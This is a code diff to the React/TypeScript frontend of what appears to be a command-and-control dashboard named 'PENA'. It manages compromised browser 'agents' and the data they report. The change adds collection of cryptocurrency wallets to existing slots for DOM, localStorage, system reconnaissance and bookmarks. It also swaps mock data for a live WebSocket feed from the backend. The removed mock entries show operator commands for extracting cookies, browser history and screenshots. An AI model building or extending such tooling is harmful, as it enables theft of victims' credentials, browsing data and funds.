@@ -26,6 +26,7 @@ interface AgentData {
   localStorage: any | null;
   systemRecon: any | null;
   bookmarks: any | null;
+  wallets: any[] | null;
 }
 
 interface AgentInfo {
@@ -33,6 +34,7 @@ interface AgentInfo {
   host: string;
   lastSeen: string;
   status: 'online' | 'offline';
+  systemInfo?: any;
 }
 
 interface AgentDataState {
@@ -50,7 +52,8 @@ type AgentDataAction =
   | { type: 'UPDATE_AGENT_DATA'; payload: { agentUID: string; section: string; data: any } }
   | { type: 'SET_ERROR'; payload: { agentUID: string; section: string; error: string } }
   | { type: 'SET_CONNECTION_STATUS'; payload: 'connected' | 'connecting' | 'disconnected' }
-  | { type: 'CLEAR_ERROR'; payload: { agentUID: string; section: string } };
+  | { type: 'CLEAR_ERROR'; payload: { agentUID: string; section: string } }
+  | { type: 'UPDATE_AGENT_STATUS'; payload: { uid: string; status: 'online' | 'offline'; lastSeen: string } };
 
 const initialState: AgentDataState = {
   agents: {},
@@ -80,7 +83,8 @@ function agentDataReducer(state: AgentDataState, action: AgentDataAction): Agent
             dom: null,
             localStorage: null,
             systemRecon: null,
-            bookmarks: null
+            bookmarks: null,
+            wallets: null
           }
         }
       };
@@ -97,6 +101,19 @@ function agentDataReducer(state: AgentDataState, action: AgentDataAction): Agent
           [agentUID]: {
             ...state.agentData[agentUID],
             [section.toLowerCase()]: data
+          }
+        }
+      };
+
+    case 'UPDATE_AGENT_STATUS':
+      return {
+        ...state,
+        agents: {
+          ...state.agents,
+          [action.payload.uid]: {
+            ...state.agents[action.payload.uid],
+            status: action.payload.status,
+            lastSeen: action.payload.lastSeen
           }
         }
       };
@@ -148,71 +165,142 @@ export const AgentDataProvider: React.FC<AgentDataProviderProps> = ({ children }
   const [state, dispatch] = useReducer(agentDataReducer, initialState);
 
   useEffect(() => {
-    // Initialize with mock data
-    const mockAgents = {
-      'AGT-001': {
-        uid: 'AGT-001',
-        host: 'desktop-pc-01.local',
-        lastSeen: '2024-05-31 14:23:15',
-        status: 'online' as const
-      },
-      'AGT-002': {
-        uid: 'AGT-002',
-        host: 'laptop-dev-02.local',
-        lastSeen: '2024-05-31 14:20:42',
-        status: 'online' as const
-      },
-      'AGT-003': {
-        uid: 'AGT-003',
-        host: 'server-main-03.local',
-        lastSeen: '2024-05-31 14:18:33',
-        status: 'offline' as const
+    let ws: WebSocket | null = null;
+    let reconnectTimeout: NodeJS.Timeout | null = null;
+
+    const connectWebSocket = () => {
+      dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'connecting' });
+      console.log('Connecting to PENA backend on ws://localhost:5000/pena');
+
+      try {
+        ws = new WebSocket('ws://localhost:5000/pena');
+
+        ws.onopen = () => {
+          console.log('Connected to PENA backend');
+          dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'connected' });
+          
+          if (reconnectTimeout) {
+            clearTimeout(reconnectTimeout);
+            reconnectTimeout = null;
+          }
+        };
+
+        ws.onmessage = (event) => {
+          try {
+            const message = JSON.parse(event.data);
+            console.log('WS received:', message);
+
+            switch (message.type) {
+              case 'agent_connect':
+                // Новый агент подключился
+                if (message.data) {
+                  const agentInfo: AgentInfo = {
+                    uid: message.data.uid,
+                    host: message.data.host,
+                    lastSeen: message.data.lastSeen,
+                    status: message.data.status,
+                    systemInfo: message.data.systemInfo
+                  };
+                  
+                  dispatch({ type: 'ADD_AGENT', payload: agentInfo });
+                  
+                  // Создаем overview данные из systemInfo
+                  if (message.data.systemInfo) {
+                    const overviewData = {
+                      status: message.data.status.toUpperCase(),
+                      lastPing: message.data.lastSeen,
+                      cpuLoad: '23.4%', // Заглушка, можно получать реальные данные позже
+                      ramUsage: '1.2GB / 8.0GB', // Заглушка
+                      hostname: message.data.systemInfo.hostname,
+                      os: message.data.systemInfo.os,
+                      browser: message.data.systemInfo.browser,
+                      ipAddress: message.data.systemInfo.ipAddress,
+                      commands: [
+                        { time: new Date().toLocaleTimeString(), command: `agent_connect(uid="${message.data.uid}")` }
+                      ]
+                    };
+
+                    dispatch({
+                      type: 'UPDATE_AGENT_DATA',
+                      payload: {
+                        agentUID: message.data.uid,
+                        section: 'overview',
+                        data: overviewData
+                      }
+                    });
+                  }
+                }
+                break;
+
+              case 'update_data':
+                // Обновление данных от агента
+                if (message.agentUID && message.section && message.data) {
+                  dispatch({
+                    type: 'UPDATE_AGENT_DATA',
+                    payload: {
+                      agentUID: message.agentUID,
+                      section: message.section,
+                      data: message.data
+                    }
+                  });
+
+                  // Обновляем статус агента
+                  dispatch({
+                    type: 'UPDATE_AGENT_STATUS',
+                    payload: {
+                      uid: message.agentUID,
+                      status: 'online',
+                      lastSeen: new Date().toLocaleString()
+                    }
+                  });
+                }
+                break;
+
+              default:
+                console.log('Unknown message type:', message.type);
+            }
+          } catch (error) {
+            console.error('Error parsing WebSocket message:', error);
+          }
+        };
+
+        ws.onclose = () => {
+          console.log('WebSocket connection closed. Attempting to reconnect...');
+          dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'disconnected' });
+          
+          // Переподключение через 5 секунд
+          reconnectTimeout = setTimeout(() => {
+            connectWebSocket();
+          }, 5000);
+        };
+
+        ws.onerror = (error) => {
+          console.error('WebSocket error:', error);
+          dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'disconnected' });
+        };
+
+      } catch (error) {
+        console.error('Failed to create WebSocket connection:', error);
+        dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'disconnected' });
+        
+        // Повторная попытка через 5 секунд
+        reconnectTimeout = setTimeout(() => {
+          connectWebSocket();
+        }, 5000);
       }
     };
 
-    dispatch({ type: 'SET_AGENTS', payload: mockAgents });
-    Object.values(mockAgents).forEach(agent => {
-      dispatch({ type: 'ADD_AGENT', payload: agent });
-    });
+    // Начинаем подключение
+    connectWebSocket();
 
-    // Simulate WebSocket connection
-    dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'connecting' });
-    
-    const connectTimeout = setTimeout(() => {
-      dispatch({ type: 'SET_CONNECTION_STATUS', payload: 'connected' });
-      console.log('Connected to PENA backend on ws://localhost:5000/pena');
-    }, 1000);
-
-    // Simulate incoming data
-    const dataTimeout = setTimeout(() => {
-      // Mock overview data for AGT-001
-      dispatch({
-        type: 'UPDATE_AGENT_DATA',
-        payload: {
-          agentUID: 'AGT-001',
-          section: 'overview',
-          data: {
-            status: 'ONLINE',
-            lastPing: '2024-01-15 14:32:18',
-            cpuLoad: '23.4%',
-            ramUsage: '1.2GB / 8.0GB',
-            hostname: 'WORKSTATION-01',
-            os: 'Windows 11 Pro',
-            browser: 'Chrome 120.0.6099.109',
-            ipAddress: '192.168.1.42',
-            commands: [
-              { time: '15:42:33', command: 'screenshot_capture(full_page=true)' },
-              { time: '15:41:12', command: 'extract_cookies(domain="example.com")' },
-              { time: '15:39:45', command: 'get_browser_history(days=7)' }
-            ]
-          }
-        }
-      });
-    }, 2000);
-
+    // Cleanup при размонтировании
     return () => {
-      clearTimeout(connectTimeout);
-      clearTimeout(dataTimeout);
+      if (reconnectTimeout) {
+        clearTimeout(reconnectTimeout);
+      }
+      if (ws) {
+        ws.close();
+      }
     };
   }, []);
 
